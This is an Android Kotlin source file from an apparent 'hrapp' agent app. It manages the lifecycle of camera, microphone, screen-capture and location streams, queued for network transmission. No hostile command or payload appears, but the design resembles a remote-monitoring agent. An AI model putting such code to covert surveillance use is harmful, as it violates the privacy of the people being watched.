package com.hrapp.agent

import android.content.Context
import android.util.Log

/**
 * Central coordinator for all media streams.
 * Each stream has independent lifecycle — one failure doesn't kill others.
 * Bounded queues prevent OOM under network backpressure.
 */
object StreamSessionManager {
    private const val TAG = "HRAPP-STREAM"

    enum class StreamState { IDLE, STARTING, RUNNING, STOPPING, FAILED }

    private val states = mutableMapOf(
        "camera" to StreamState.IDLE,
        "mic" to StreamState.IDLE,
        "screen" to StreamState.IDLE,
        "location" to StreamState.IDLE
    )

    // Bounded queues: camera/screen = 3 frames max (drop oldest), mic = 10 chunks
    val cameraQueue = BoundedFrameQueue("camera", 3)
    val screenQueue = BoundedFrameQueue("screen", 3)
    val micQueue = BoundedFrameQueue("mic", 10)

    fun startCamera(ctx: Context, facing: String = "back") {
        if (states["camera"] == StreamState.RUNNING) {
            Log.d(TAG, "camera already running, stop+restart for facing=$facing")
        }
        transition("camera", StreamState.STARTING)
        try {
            CameraModule.start(ctx, facing)
            transition("camera", StreamState.RUNNING)
        } catch (e: Exception) {
            Log.e(TAG, "camera start failed: ${e.message}")
            transition("camera", StreamState.FAILED)
            Agent.log("camera FAILED: ${e.message}")
        }
    }

    fun stopCamera() {
        if (states["camera"] == StreamState.IDLE) return
        transition("camera", StreamState.STOPPING)
        cameraQueue.clear()
        CameraModule.stop()
        transition("camera", StreamState.IDLE)
    }

    fun startMic(ctx: Context) {
        if (states["mic"] == StreamState.RUNNING) return
        transition("mic", StreamState.STARTING)
        try {
            MicModule.start(ctx)
            transition("mic", StreamState.RUNNING)
        } catch (e: Exception) {
            Log.e(TAG, "mic start failed: ${e.message}")
            transition("mic", StreamState.FAILED)
            Agent.log("mic FAILED: ${e.message}")
        }
    }

    fun stopMic() {
        if (states["mic"] == StreamState.IDLE) return
        transition("mic", StreamState.STOPPING)
        micQueue.clear()
        MicModule.stop()
        transition("mic", StreamState.IDLE)
    }

    fun startScreen(ctx: Context) {
        if (states["screen"] == StreamState.RUNNING) return
        transition("screen", StreamState.STARTING)
        // ScreenCaptureModule requires MediaProjection intent from MainActivity
        // — state is set to STARTING here; actual RUNNING transition happens
        // when ScreenCaptureModule reports back via sendStreamStatus("screen","started")
        ScreenCaptureModule.start(ctx)
    }

    fun stopScreen(ctx: Context) {
        if (states["screen"] == StreamState.IDLE) return
        transition("screen", StreamState.STOPPING)
        screenQueue.clear()
        ScreenCaptureModule.stop(ctx)
        transition("screen", StreamState.IDLE)
    }

    fun startLocation(ctx: Context) {
        if (states["location"] == StreamState.RUNNING) return
        transition("location", StreamState.STARTING)
        LocationModule.requestOnce(ctx)
        transition("location", StreamState.RUNNING)
    }

    fun stopLocation() {
        transition("location", StreamState.IDLE)
    }

    /** Called by stream modules when they self-report state changes. */
    fun onStreamStatus(stream: String, status: String) {
        when (status) {
            "started" -> transition(stream, StreamState.RUNNING)
            "stopped" -> transition(stream, StreamState.IDLE)
            "failed"  -> transition(stream, StreamState.FAILED)
        }
    }

    fun getState(stream: String): StreamState = states[stream] ?: StreamState.IDLE

    fun stopAll(ctx: Context) {
        stopCamera()
        stopMic()
        stopScreen(ctx)
        stopLocation()
        Log.d(TAG, "all streams stopped. camera=${cameraQueue.stats()} mic=${micQueue.stats()}")
    }

    private fun transition(stream: String, next: StreamState) {
        val prev = states[stream]
        states[stream] = next
        Log.d(TAG, "STREAM[$stream]: $prev → $next")
    }
}
